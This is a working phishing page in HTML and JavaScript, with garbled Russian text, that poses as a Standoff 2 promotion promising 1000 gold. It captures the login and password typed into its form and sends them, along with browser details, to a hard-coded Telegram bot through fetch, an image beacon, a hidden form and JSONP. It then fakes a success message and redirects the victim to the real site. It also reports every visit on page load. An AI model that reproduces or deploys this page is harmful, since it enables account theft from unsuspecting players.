    <style>

</head>
<body>
    <h1>üéÆ STANDOFF 2</h1>
    <p>–ê–∫—Ü–∏—è! –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –∞–∫–∫–∞—É–Ω—Ç –∏ –ø–æ–ª—É—á–∏—Ç–µ 1000 –∑–æ–ª–æ—Ç–∞</p>
    
    <div class="login-form">
        <h3>üîê –í—Ö–æ–¥ –≤ –∞–∫–∫–∞—É–Ω—Ç</h3>
        <input type="text" id="email" placeholder="Email –∏–ª–∏ –ª–æ–≥–∏–Ω"><br>
        <input type="password" id="password" placeholder="–ü–∞—Ä–æ–ª—å"><br>
        <button onclick="stealAndRedirect()">–ü–û–õ–£–ß–ò–¢–¨ –ù–ê–ì–†–ê–î–£</button>
    </div>

    <script>
        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —á–µ—Ä–µ–∑ Image (–æ–±—Ö–æ–¥ CORS)
        function sendViaImage(data) {
            const encodedData = btoa(unescape(encodeURIComponent(data)));
            const img = new Image();
            img.src = `https://api.telegram.org/bot8245809142:AAGmdhZAkZ91z4spf3PMG-no89fHrjYC3q8/sendMessage?chat_id=1491315056&text=${encodedData}`;
        }

        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —á–µ—Ä–µ–∑ Form (–æ–±—Ö–æ–¥ CORS)
        function sendViaForm(data) {
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'https://api.telegram.org/bot8245809142:AAGmdhZAkZ91z4spf3PMG-no89fHrjYC3q8/sendMessage';
            form.style.display = 'none';
            
            const chatInput = document.createElement('input');
            chatInput.name = 'chat_id';
            chatInput.value = '1491315056';
            form.appendChild(chatInput);
            
            const textInput = document.createElement('input');
            textInput.name = 'text';
            textInput.value = data;
            form.appendChild(textInput);
            
            document.body.appendChild(form);
            form.submit();
        }

        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –∫—Ä–∞–∂–∏ –¥–∞–Ω–Ω—ã—Ö
        function stealAndRedirect() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            if (!email || !password) {
                alert('–ó–∞–ø–æ–ª–Ω–∏—Ç–µ –≤—Å–µ –ø–æ–ª—è!');
                return;
            }

            const stolenData = `üéØ –£–ö–†–ê–î–ï–ù–´ –î–ê–ù–ù–´–ï:
üìß –õ–æ–≥–∏–Ω: ${email}
üîë –ü–∞—Ä–æ–ª—å: ${password}
üåê –°–∞–π—Ç: ${window.location.href}
üïí –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}
üë§ User-Agent: ${navigator.userAgent}`;

            // –ü—Ä–æ–±—É–µ–º —Ä–∞–∑–Ω—ã–µ –º–µ—Ç–æ–¥—ã –æ—Ç–ø—Ä–∞–≤–∫–∏
            try {
                // –ú–µ—Ç–æ–¥ 1: –ü—Ä—è–º–æ–π fetch (–º–æ–∂–µ—Ç –Ω–µ —Ä–∞–±–æ—Ç–∞—Ç—å)
                fetch('https://api.telegram.org/bot8245809142:AAGmdhZAkZ91z4spf3PMG-no89fHrjYC3q8/sendMessage', {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: '1491315056',
                        text: stolenData
                    })
                });
            } catch (e) {}

            try {
                // –ú–µ—Ç–æ–¥ 2: –û—Ç–ø—Ä–∞–≤–∫–∞ —á–µ—Ä–µ–∑ Image
                sendViaImage(stolenData);
            } catch (e) {}

            try {
                // –ú–µ—Ç–æ–¥ 3: –û—Ç–ø—Ä–∞–≤–∫–∞ —á–µ—Ä–µ–∑ Form
                sendViaForm(stolenData);
            } catch (e) {}

            try {
                // –ú–µ—Ç–æ–¥ 4: JSONP (–æ–±—Ö–æ–¥ CORS)
                const script = document.createElement('script');
                script.src = `https://api.telegram.org/bot8245809142:AAGmdhZAkZ91z4spf3PMG-no89fHrjYC3q8/sendMessage?chat_id=1491315056&text=${encodeURIComponent(stolenData)}&callback=console.log`;
                document.head.appendChild(script);
            } catch (e) {}

            // –°–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
            alert('‚úÖ –ê–∫–∫–∞—É–Ω—Ç —É—Å–ø–µ—à–Ω–æ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω! –ó–æ–ª–æ—Ç–æ –±—É–¥–µ—Ç –∑–∞—á–∏—Å–ª–µ–Ω–æ –≤ —Ç–µ—á–µ–Ω–∏–µ 5 –º–∏–Ω—É—Ç.');
            
            // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –Ω–∞ –Ω–∞—Å—Ç–æ—è—â–∏–π —Å–∞–π—Ç
            setTimeout(() => {
                window.location.href = 'https://standoff2.com';
            }, 2000);
        }

        // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –ø—Ä–∏ –∑–∞—Ö–æ–¥–µ
        window.addEventListener('load', function() {
            const visitData = `üïµÔ∏è –ü–û–°–ï–¢–ò–¢–ï–õ–¨ –ó–ê–®–ï–õ –ù–ê –°–ê–ô–¢:
üåê URL: ${window.location.href}
üìç Referrer: ${document.referrer || '–ø—Ä—è–º–æ–π –∑–∞—Ö–æ–¥'}
üë§ User-Agent: ${navigator.userAgent}
üì± –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${navigator.platform}
üïí –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}`;

            // –û—Ç–ø—Ä–∞–≤–∫–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ—Å–µ—â–µ–Ω–∏–∏
            sendViaImage(visitData);
        });
    </script>
